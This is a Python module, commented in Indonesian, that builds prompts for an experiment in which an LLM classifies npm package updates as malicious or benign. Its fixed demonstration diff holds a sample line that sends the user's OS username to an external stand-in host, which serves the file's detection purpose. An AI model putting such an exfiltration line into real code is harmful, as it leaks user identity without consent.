"""Prompt builder per konfigurasi eksperimen (E0-E4).

Perbedaan antar konfigurasi HANYA pada contoh yang disertakan — smart-diff,
intent, dan decision rule identik di semua konfigurasi. Kalau tidak begitu,
selisih F1 antar konfigurasi tidak bisa diklaim berasal dari retrieval.
"""

CONFIGS = ["E0", "E1", "E2", "E3", "E4"]

SYSTEM = """Kamu menganalisis satu update paket npm dan memutuskan apakah update itu jahat.

Aturan keputusan: perilaku sensitif TIDAK otomatis jahat. Yang menentukan adalah
kombinasi capability, execution context, kesesuaian dengan intent paket, dan bukti
yang tersedia. Operasi yang sah — telemetry opt-in, tooling test, perubahan
lisensi, scraper, deprecation — sering memakai API yang sama dengan payload jahat.

Jawab HANYA dengan JSON:
{"verdict": "malicious" | "benign", "evidence": ["baris atau konstruksi yang jadi dasar"], "reason": "satu kalimat"}"""

# E1 memakai demonstrasi tetap yang sama untuk SEMUA update: itu yang memisahkan
# "efek punya contoh" dari "efek contoh yang relevan" (E2+).
FIXED_DEMO = {
    "intent": "Utility untuk memformat tanggal",
    "diff": "+const os = require('os');\n+fetch('http://collect.example/i', {method:'POST', body: os.userInfo().username});",
    "verdict": "malicious",
    "reason": "Formatter tanggal tidak punya alasan mengirim identitas user ke host eksternal.",
}


def _pair_block(pair):
    lines = [f"Paket: {pair.get('name', pair['id'])}"]
    if pair.get("before") or pair.get("after"):
        lines.append(f"Versi: {pair.get('before', '?')} -> {pair.get('after', '?')}")
    lines.append(f"Intent paket: {pair.get('intent') or '(tidak tersedia)'}")
    if pair.get("delta"):
        lines.append("Capability delta: " + ", ".join(pair["delta"]))
    lines.append("Smart-diff:\n" + pair.get("diff", ""))
    return "\n".join(lines)


def _card_block(card):
    head = f"[Contoh {card['label'].upper()}] {card.get('name', card['id'])}"
    body = [f"Intent: {card.get('intent', '-')}"]
    if card.get("delta"):
        body.append("Capability delta: " + ", ".join(card["delta"]))
    body.append(f"Kenapa: {card.get('summary', '-')}")
    return head + "\n" + "\n".join(body)


def _demo_block():
    d = FIXED_DEMO
    return (
        f"[Contoh {d['verdict'].upper()}]\nIntent: {d['intent']}\n"
        f"Smart-diff:\n{d['diff']}\nKenapa: {d['reason']}"
    )


def build(config, pair, cards=()):
    """Rakit messages untuk satu konfigurasi. `cards` sudah dipilih pemanggil."""
    if config not in CONFIGS:
        raise ValueError(f"konfigurasi tidak dikenal: {config}")

    parts = []
    if config == "E1":
        parts.append(_demo_block())
    elif config in ("E2", "E3", "E4"):
        parts.extend(_card_block(c) for c in cards)

    parts.append("Update yang dinilai:\n" + _pair_block(pair))
    return [
        {"role": "system", "content": SYSTEM},
        {"role": "user", "content": "\n\n---\n\n".join(parts)},
    ]
